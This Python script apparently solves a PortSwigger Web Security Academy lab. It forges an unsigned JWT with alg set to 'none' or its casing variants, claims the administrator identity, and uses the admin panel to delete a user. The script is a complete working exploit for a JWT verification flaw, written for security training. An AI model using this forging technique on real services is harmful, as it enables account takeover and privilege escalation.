#!/usr/bin/env python3
"""
JWT authentication bypass via flawed signature verification
PortSwigger Web Security Academy -- JWT

Companion script for the writeup: 02-flawed-signature-verification.md

What this does:
    Logs in normally to get a genuine session JWT, then rebuilds it with the
    algorithm changed to "none" and the signature dropped (keeping the
    trailing dot, since a none-alg token still must parse as three parts).
    Because some implementations filter for the literal string "none"
    case-sensitively, this probes the casing variants "none"/"None"/"NONE"/
    "nOnE" in turn against /admin and uses whichever one the server accepts,
    exactly as our detection routine does generally for this bug class. The
    real lab accepted plain lowercase "none" first try. Once accepted, the
    delete request against carlos solves the lab.

Usage:
    python 02-flawed-signature-verification.py <lab-url>
    e.g. python 02-flawed-signature-verification.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import base64
import json
import re
import sys
import httpx


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _b64url_decode(s: str) -> bytes:
    s += "=" * (4 - len(s) % 4)
    return base64.urlsafe_b64decode(s)


def decode_jwt(token: str) -> tuple[dict, dict, str]:
    parts = token.split(".")
    header = json.loads(_b64url_decode(parts[0]))
    payload = json.loads(_b64url_decode(parts[1]))
    sig = parts[2] if len(parts) > 2 else ""
    return header, payload, sig


def exploit_forge_none(jwt_token: str, new_claims: dict, alg_variant: str = "none") -> str:
    """Forge a JWT with alg set to a none-variant and modified claims, no signature."""
    header, payload, _ = decode_jwt(jwt_token)
    header["alg"] = alg_variant
    payload.update(new_claims)
    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h}.{p}."


def _login(client: httpx.Client, base: str, username: str = "wiener", password: str = "peter") -> str:
    r = client.get(f"{base}/login")
    m = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
    csrf = m.group(1) if m else ""

    r = client.post(f"{base}/login", data={
        "csrf": csrf, "username": username, "password": password
    }, follow_redirects=False)
    if r.status_code in (301, 302):
        loc = r.headers.get("location", "/")
        if loc.startswith("/"):
            loc = f"{base}{loc}"
        client.get(loc, follow_redirects=True)
    return client.cookies.get("session", "")


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)

    session = _login(client, lab_url)
    if not session:
        print("[-] Login failed")
        return
    print(f"[+] Got session JWT: {session[:50]}...")

    for alg_variant in ["none", "None", "NONE", "nOnE"]:
        forged = exploit_forge_none(session, {"sub": "administrator"}, alg_variant)
        print(f"[*] Trying alg={alg_variant!r} -- {forged}")

        client.cookies.clear()
        client.cookies.set("session", forged)
        r = client.get(f"{lab_url}/admin")
        print(f"[*] /admin -> {r.status_code}")

        if r.status_code == 200:
            print(f"[+] Server accepted alg={alg_variant!r}")
            if "/admin/delete" in r.text:
                r = client.get(f"{lab_url}/admin/delete?username=carlos")
                print(f"[*] Delete carlos -> {r.status_code}")

            check = client.get(lab_url)
            if "Congratulations" in check.text:
                print("[+] Lab solved.")
                return
            break

    else:
        print("[-] None of the none-alg casing variants were accepted.")
        return

    check = client.get(lab_url)
    if "Congratulations" not in check.text:
        print("[-] Not solved yet -- inspect the /admin response for the delete link.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
